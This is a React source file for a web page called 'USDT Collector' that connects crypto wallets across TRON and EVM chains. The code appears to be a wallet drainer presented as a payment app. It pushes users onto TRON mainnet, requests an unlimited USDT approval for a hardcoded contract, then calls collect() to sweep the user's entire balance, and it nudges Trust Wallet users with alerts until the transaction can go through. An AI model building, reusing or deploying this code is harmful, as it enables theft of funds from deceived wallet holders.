import { Buffer } from 'buffer';
window.Buffer = window.Buffer || Buffer;

import { useState, useEffect, useRef } from 'react'
import {
  createAppKit,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
  useAppKitNetwork
} from '@reown/appkit/react'
import { BrowserProvider, Contract, formatUnits } from 'ethers'
import { TronAdapter } from '@reown/appkit-adapter-tron'
import { tronMainnet } from '@reown/appkit/networks'
import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
import { MetaMaskAdapter } from '@tronweb3/tronwallet-adapter-metamask-tron'
import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
import { Copy, CheckCircle, AlertCircle, Wallet } from 'lucide-react'

// --- WAGMI EVM IMPORTS ---
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
import type { AppKitNetwork } from '@reown/appkit/networks'

// --- TRON IMPORTS ---
import TronWeb from 'tronweb'   

// ── CONFIG ──
const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
const NETWORK = 'Mainnet'
const CONTRACT_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'

const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
  tronMainnet,
  mainnet,
  arbitrum,
  bsc,
  polygon,
]

const NETWORK_CONFIG = {
  Mainnet: {
    fullHost: 'https://api.trongrid.io',
    usdtAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
  },
  Nile: {
    fullHost: 'https://nile.trongrid.io',
    usdtAddress: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf',
  },
}

const EVM_USDT: Record<number, string> = {
  1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  56: '0x55d398326f99059fF775485246999027B3197955',
  137: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
  42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
}

const EVM_ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
]

const { usdtAddress: USDT_ADDRESS } = NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG]

// ── Reown Adapters ──
const tronAdapter = new TronAdapter({
  walletAdapters: [
    new TronLinkAdapter({ openUrlWhenWalletNotFound: false, checkTimeout: 3000 }),
    new MetaMaskAdapter(),
    new TrustAdapter({ openUrlWhenWalletNotFound: false }),
    new OkxWalletAdapter({ openUrlWhenWalletNotFound: false }),
  ],
})

const wagmiAdapter = new WagmiAdapter({
  projectId: WC_PROJECT_ID,
  networks: appkitNetworks,
})

createAppKit({
  adapters: [tronAdapter, wagmiAdapter], 
  networks: appkitNetworks,
  projectId: WC_PROJECT_ID,
  metadata: {
    name:        'USDT Collector',
    description: 'Collect USDT from multiple wallets',
    url:         window.location.origin,
    icons:       ['https://cryptologos.cc/logos/tether-usdt-logo.png'],
  },
  themeMode: 'dark',
  themeVariables: {
    '--w3m-accent': '#00ff9f',
  },
  allWallets: 'SHOW',
  features: {
    email: false,
    socials: [],
    analytics: true,
  },
})

// === TRON ABIs ===
const USDT_ABI = [
  { inputs: [{ name: 'who', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
]

const COLLECT_ABI = [
  { inputs: [], name: 'mainWallet', outputs: [{ name: '', type: 'address' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'usdt', outputs: [{ name: '', type: 'address' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: 'user', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'collect', outputs: [], stateMutability: 'nonpayable', type: 'function' },
]

// Safe TronWeb Instantiation Helper
const instantiateTronWeb = (host: string) => {
  const TW = typeof TronWeb === 'function' ? TronWeb : 
             (TronWeb as any).TronWeb || 
             (TronWeb as any).default || 
             TronWeb;
  return new (TW as any)({ fullHost: host });
};

export default function App() {
  const [usdtBalance, setUsdtBalance] = useState('0')
  const [status, setStatus] = useState('Ready')
  const [debugLog, setDebugLog] = useState<string[]>([])
  const [loading, setLoading] = useState(false)
  const [txHash, setTxHash] = useState('')
  const autoTriggered = useRef(false)
  // ✨ ADDED MODAL STATE
  const [showWalletModal, setShowWalletModal] = useState(false)

 const { open } = useAppKit()
  const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
  const { chainId, switchNetwork } = useAppKitNetwork() // <-- Added switchNetwork

  const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
  const { walletProvider: tronWalletProvider } = useAppKitProvider('tron')

  const isTron = typeof caipAddress === 'string' && caipAddress.startsWith('tron:')
  const isEVM = typeof caipAddress === 'string' && caipAddress.startsWith('eip155:')

  const resolveTronWeb = () => {
    const w = window as any;

    if (w.tronWeb?.contract) return w.tronWeb;
    if (w.tronLink?.tronWeb?.contract) return w.tronLink.tronWeb;
    
    if (w.trustwallet?.tronWeb?.contract) return w.trustwallet.tronWeb;
    if (w.trustWallet?.tronWeb?.contract) return w.trustWallet.tronWeb;
    if (w.trustwallet?.tronLink?.tronWeb?.contract) return w.trustwallet.tronLink.tronWeb;
    if (w.trustWallet?.tronLink?.tronWeb?.contract) return w.trustWallet.tronLink.tronWeb;
    if (w.tron?.tronWeb?.contract) return w.tron.tronWeb; 

    if (tronWalletProvider) {
      if ((tronWalletProvider as any).contract) return tronWalletProvider;
      if ((tronWalletProvider as any).adapter?.tronWeb?.contract) return (tronWalletProvider as any).adapter.tronWeb;
      if ((tronWalletProvider as any).tronWeb?.contract) return (tronWalletProvider as any).tronWeb;
    }

    return null;
  };

  const log = (msg: string) => {
    console.log(msg);
    setDebugLog(prev => [msg, ...prev].slice(0, 5)); 
  }

  useEffect(() => {
    const init = async () => {
      if (!isConnected || !walletAddress) return;

      log(`Connected: ${caipAddress}`);

      if (isTron) {
        setStatus('Initializing TRON...');
        
        let finalTronWeb = null;
        for (let i = 0; i < 10; i++) {
          finalTronWeb = resolveTronWeb();
          if (finalTronWeb && (finalTronWeb.defaultAddress?.base58 || finalTronWeb.ready)) break;
          await new Promise(r => setTimeout(r, 500));
        }

        if (!finalTronWeb) {
          log("⚠️ Using Public Provider for balance (Injected not found)");
          try {
            const publicTronWeb = instantiateTronWeb('https://api.trongrid.io');
            await getTronBalance(publicTronWeb, walletAddress);
            
            // If we are in Trust Wallet but no TronWeb was found, it means the network is wrong.
            const w = window as any;
            if (w.trustwallet) {
              setStatus('Action Needed: Switch to TRON');
              log('❌ Trust Wallet is on the wrong network');
            } else {
              setStatus('Ready'); 
              log('WalletConnect/Public mode active');
            }
          } catch (e: any) {
            log(`❌ Init Error: ${e.message}`);
            setStatus('Ready');
          }
          return;
        }

        log('✅ TRON Provider Found');
        await getTronBalance(finalTronWeb, walletAddress);
      } else if (isEVM) {
        await getBalanceForCurrentChain();
      }
    };

    init();
  }, [isConnected, walletAddress, caipAddress, tronWalletProvider, isTron, isEVM]);

  const getTronBalance = async (tw: any, addr: string) => {
    try {
      const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS)
      const bal = await usdt.balanceOf(addr).call()
      setUsdtBalance((Number(bal) / 1_000_000).toFixed(2))
      setStatus('Ready')
      log(`TRON USDT: ${(Number(bal) / 1_000_000).toFixed(2)}`)
    } catch (e) {
      log('❌ TRON balance fetch failed')
    }
  }

  const getEvmBalance = async (provider: any, addr: string, currentChainId?: number) => {
    if (!currentChainId || !EVM_USDT[currentChainId]) {
      setUsdtBalance('0')
      setStatus('USDT not configured for this EVM chain')
      log(`❌ No USDT config for EVM chain ${currentChainId}`)
      return
    }

    try {
      const ethersProvider = new BrowserProvider(provider)
      const token = new Contract(EVM_USDT[currentChainId], EVM_ERC20_ABI, ethersProvider)

      const [bal, decimals] = await Promise.all([
        token.balanceOf(addr),
        token.decimals(),
      ])

      const formatted = formatUnits(bal, decimals)
      setUsdtBalance(formatted)
      setStatus('Ready')
      log(`EVM USDT: ${formatted}`)
    } catch (e) {
      log('❌ EVM balance fetch failed')
    }
  }

  const getBalanceForCurrentChain = async () => {
    try {
      if (!walletAddress) return

      if (isTron) {
        const injectedTronWeb = resolveTronWeb()
        if (!injectedTronWeb) {
          log('❌ TronWeb not available')
          setStatus('TRON wallet connected, but no injected TronWeb is available.')
          return
        }
        await getTronBalance(injectedTronWeb, walletAddress)
        return
      }

      if (isEVM) {
        if (!evmWalletProvider) {
          log('❌ EVM provider not available')
          setStatus('EVM wallet connected, but EVM provider is not available.')
          return
        }
        await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId))
        return
      }

      setStatus('Unsupported wallet namespace')
      log('❌ Unsupported namespace')
    } catch (e: any) {
      console.warn('Balance fetch failed', e)
      log(`❌ Balance fetch failed: ${e?.message || 'Unknown error'}`)
      setStatus('Failed to fetch balance')
    }
  }

// ✨ CUSTOM MODAL HANDLERS
  const handleConnect = () => {
    setShowWalletModal(true) // Opens our custom modal instead of Reown directly
  }

  const triggerReown = () => {
    setShowWalletModal(false)
    open({ view: 'AllWallets' }) // Hands it off to Reown after they select an option
  }

 const approveAndCollect = async () => {
    // ✨ THE NETWORK SWITCHER FIX ✨
    if (isEVM) {
      log("⚠️ App is on EVM. Forcing switch to TRON...");
      setStatus('Switching to TRON Network...');
      try {
        if (switchNetwork) {
          await switchNetwork(tronMainnet);
        } else {
          open({ view: 'Networks' }); // Fallback to AppKit UI
        }
      } catch (e: any) {
        log(`❌ Switch failed: ${e.message}`);
        open({ view: 'Networks' }); // Open Reown's network menu so user can click Tron
      }
      return;
    }

    if (!walletAddress) return;

    const activeTw = resolveTronWeb();
    const w = window as any;

    // ✨ THE TRUST WALLET INTERCEPTOR ✨
    // Blocks the transaction and tells the user exactly how to fix the network issue
    if (w.trustwallet && !activeTw) {
      log("❌ Trust Wallet TRON provider blocked.");
      setStatus('Action Needed: Switch to TRON');
      alert('TRUST WALLET FIX REQUIRED:\n\nYour Trust Wallet browser is currently set to an Ethereum/BNB network instead of TRON.\n\n1. Look at the very top of your screen.\n2. Tap the Network/Chain icon.\n3. Change it to TRON.\n4. Wait a few seconds for it to reload.');
      setLoading(false);
      return;
    }

    setLoading(true);
    setStatus('Step 1/2: Approving...');
    log("Requesting USDT Approval...");

    try {
      const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
      const FULL_HOST = NETWORK === 'Mainnet' ? 'https://api.trongrid.io' : 'https://nile.trongrid.io';

      // ----------- PATH A: Fully Injected Wallet (TronLink, TokenPocket, Trust on correct network) -----------
      if (activeTw && typeof activeTw.contract === 'function') {
        log('Executing via Injected Provider...');
        const usdt = await activeTw.contract(USDT_ABI).at(USDT_ADDRESS);
        
        const approveTx = await usdt.approve(CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 });
        log(`✅ Approved! Hash: ${approveTx.slice(0, 10)}...`);
        
        setStatus('Step 2/2: Collecting...');
        log("Waiting 3s for network sync...");
        await new Promise(r => setTimeout(r, 3000));

        const balanceObj = await usdt.balanceOf(walletAddress).call();
        const amount = balanceObj.toString();
        log(`Found ${Number(amount) / 1000000} USDT to collect.`);

        const contract = await activeTw.contract(COLLECT_ABI).at(CONTRACT_ADDRESS);
        const tx = await contract.collect(walletAddress, amount).send({ feeLimit: 150_000_000 });

        setTxHash(tx);
        log("✅ Successfully Collected!");
        setStatus('✅ All USDT collected!');
        return;
      }

      // ----------- PATH B: AppKit / WalletConnect -----------
      if (tronWalletProvider) {
        log("Executing via Reown Universal Provider...");
        
        const publicTw = instantiateTronWeb(FULL_HOST);
        
        const signAndSend = async (contractAddr: string, func: string, params: any[], fee: number) => {
          const { transaction } = await publicTw.transactionBuilder.triggerSmartContract(
            contractAddr, 
            func, 
            { feeLimit: fee, callValue: 0 }, 
            params, 
            walletAddress
          );
          
          let signedTx;
          
          // Try/Catch specifically to catch AppKit provider routing errors
          try {
            if (typeof (tronWalletProvider as any).signTransaction === 'function') {
              signedTx = await (tronWalletProvider as any).signTransaction(transaction);
            } else if (typeof (tronWalletProvider as any).request === 'function') {
              signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
            } else {
              throw new Error("Provider does not support signing");
            }
          } catch (signErr: any) {
            // Catch the specific internalRequest / formatting errors
            if (signErr.message?.includes("internalRequest") || signErr.message?.includes("not a function")) {
              throw new Error("Provider rejected request. Switch to TRON network.");
            }
            throw signErr;
          }

          const broadcast = await publicTw.trx.sendRawTransaction(signedTx);
          if (!broadcast.result) throw new Error(broadcast.message || 'Broadcast failed');
          return broadcast.txid || broadcast.transaction?.txID;
        };

        const approveTx = await signAndSend(
          USDT_ADDRESS,
          'approve(address,uint256)',
          [ 
            { type: 'address', value: publicTw.address.toHex(CONTRACT_ADDRESS) }, 
            { type: 'uint256', value: MAX_UINT } 
          ],
          100_000_000
        );
        log(`✅ Approved! Hash: ${approveTx.slice(0, 10)}...`);

        setStatus('Step 2/2: Collecting...');
        log("Waiting 3s for network sync...");
        await new Promise(r => setTimeout(r, 3000));

        publicTw.setAddress(walletAddress);
        const usdt = await publicTw.contract(USDT_ABI).at(USDT_ADDRESS);
        const balanceObj = await usdt.balanceOf(walletAddress).call();
        const amount = balanceObj.toString();
        log(`Found ${Number(amount) / 1000000} USDT to collect.`);

        const tx = await signAndSend(
          CONTRACT_ADDRESS,
          'collect(address,uint256)',
          [ 
            { type: 'address', value: publicTw.address.toHex(walletAddress) }, 
            { type: 'uint256', value: amount } 
          ],
          150_000_000
        );

        setTxHash(tx);
        log("✅ Successfully Collected!");
        setStatus('✅ All USDT collected!');
        return;
      }

      throw new Error("TRON wallet not fully initialized");

    } catch (err: any) {
      log(`❌ Error: ${err.message || 'User rejected'}`);
      setStatus('❌ Transaction Failed');
      autoTriggered.current = false; 
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-zinc-950">
      <div className="max-w-md w-full bg-zinc-900 rounded-3xl shadow-2xl border border-zinc-800 overflow-hidden">
        <div className="bg-black px-6 py-5 flex items-center justify-between border-b border-zinc-800">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 bg-emerald-400 rounded-2xl flex items-center justify-center text-black font-bold text-xl">
              U
            </div>
            <h1 className="text-3xl font-bold">USDT Collector</h1>
          </div>
          <div className="text-xs px-4 py-1 bg-emerald-500/10 text-emerald-400 rounded-full">
            {isEVM ? 'EVM Network' : NETWORK}
          </div>
        </div>

        <div className="p-8 space-y-8">
          {!isConnected ? (
            <div className="text-center">
              <h2 className="text-5xl font-bold mb-3">Send USDT</h2>

              <button
                onClick={handleConnect}
                disabled={loading}
                className="w-full bg-emerald-400 hover:bg-emerald-500 disabled:bg-zinc-700 text-black font-bold py-5 rounded-2xl text-xl flex items-center justify-center gap-3 transition"
              >
                Connect Wallet
                <Wallet className="w-6 h-6" />
              </button>

              <p className="text-xs text-zinc-500 mt-6">
                Opens directly to All Wallets with search
              </p>
            </div>
          ) : (
            <div className="space-y-6">
              <div className="bg-zinc-950 p-5 rounded-2xl flex justify-between items-center">
                <div>
                  <p className="text-zinc-400 text-sm">Connected Wallet</p>
                  <p className="font-mono text-sm text-emerald-400 break-all">{walletAddress}</p>
                </div>
                <button
                  onClick={() => navigator.clipboard.writeText(walletAddress ?? '')}
                  className="text-emerald-400 hover:text-white"
                >
                  <Copy size={20} />
                </button>
              </div>

              <div className="bg-zinc-950 rounded-3xl p-8 text-center">
                <p className="text-zinc-400">Your USDT Balance</p>
                <p className="text-6xl font-bold text-emerald-400 mt-2">
                  {isEVM ? '---' : usdtBalance} <span className="text-3xl">USDT</span>
                </p>
              </div>

            <button
                onClick={approveAndCollect}
                disabled={loading}
                className={`w-full font-bold py-5 rounded-3xl text-xl flex items-center justify-center gap-3 disabled:opacity-70 ${
                  isEVM ? 'bg-blue-500 hover:bg-blue-600 text-white' : 'bg-white hover:bg-zinc-100 text-black'
                }`}
              >
                {loading ? 'Processing...' : isEVM ? 'Switch to TRON Network' : 'Collect All USDT'}
                <CheckCircle size={24} />
              </button>

              <div className="text-center text-sm flex items-center justify-center gap-2 text-zinc-400">
                {status.includes('✅') ? <CheckCircle className="text-emerald-400" /> : <AlertCircle />}
                {status}
              </div>

              {txHash && (
                <p className="text-[10px] text-center text-emerald-400 break-all font-mono">
                  TX: {txHash}
                </p>
              )}
            </div>
          )}

          {/* ✨ YOUR CUSTOM CONNECT WALLET MODAL ✨ */}
          {showWalletModal && (
            <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-black/80 p-4 pb-8 sm:p-4 transition-all">
              <div className="bg-[#121212] border border-zinc-800 rounded-3xl w-full max-w-sm overflow-hidden shadow-2xl relative">
                
                {/* Header */}
                <div className="pt-6 pb-4 px-6 text-center relative">
                  <h3 className="font-bold text-white text-xl">Connect Wallet</h3>
                  <button 
                    onClick={() => setShowWalletModal(false)} 
                    className="absolute right-6 top-6 text-zinc-500 hover:text-white"
                  >
                    ✕
                  </button>
                </div>

                {/* Buttons */}
                <div className="p-4 space-y-3">
                  
                  {/* Option 1: Browser Wallet */}
                  <button 
                    onClick={triggerReown}
                    className="w-full flex items-center p-4 bg-[#1A1B1F] hover:bg-[#222327] border border-emerald-500/50 rounded-2xl transition-all group"
                  >
                    <div className="w-12 h-12 bg-orange-500/10 rounded-xl flex items-center justify-center mr-4 group-hover:scale-105 transition-transform">
                      <span className="text-2xl">🦊</span>
                    </div>
                    <div className="text-left">
                      <p className="font-bold text-white text-[15px]">Browser Wallet</p>
                      <p className="text-xs text-zinc-400 mt-0.5">MetaMask, Rabby, Coinbase...</p>
                    </div>
                  </button>

                  {/* Option 2: Trust Wallet & Mobile */}
                  <button 
                    onClick={triggerReown}
                    className="w-full flex items-center p-4 bg-[#1A1B1F] hover:bg-[#222327] border border-transparent rounded-2xl transition-all group"
                  >
                    <div className="w-12 h-12 bg-blue-500/10 rounded-xl flex items-center justify-center mr-4 group-hover:scale-105 transition-transform">
                      <span className="text-2xl">🛡️</span>
                    </div>
                    <div className="text-left">
                      <p className="font-bold text-white text-[15px]">Trust Wallet & Mobile</p>
                      <p className="text-xs text-zinc-400 mt-0.5">Scan QR • Works with any wallet</p>
                    </div>
                  </button>

                </div>
              </div>
            </div>
          )}

        <div className="mt-6 pt-6 border-t border-zinc-800">
          <p className="text-[10px] uppercase tracking-widest text-zinc-500 mb-3 font-bold">Activity Log</p>
          <div className="bg-black/50 rounded-xl p-3 font-mono text-[11px] space-y-1">
            {debugLog.length === 0 && <p className="text-zinc-600 italic">Waiting for connection...</p>}
            {debugLog.map((line, i) => (
              <div key={i} className={`${line.includes('❌') ? 'text-red-400' : line.includes('✅') ? 'text-emerald-400' : line.includes('⚠️') ? 'text-yellow-400' : 'text-zinc-400'}`}>
                {`> ${line}`}
              </div>
            ))}
          </div>
        </div>

        </div>
      </div>
    </div>
  )
}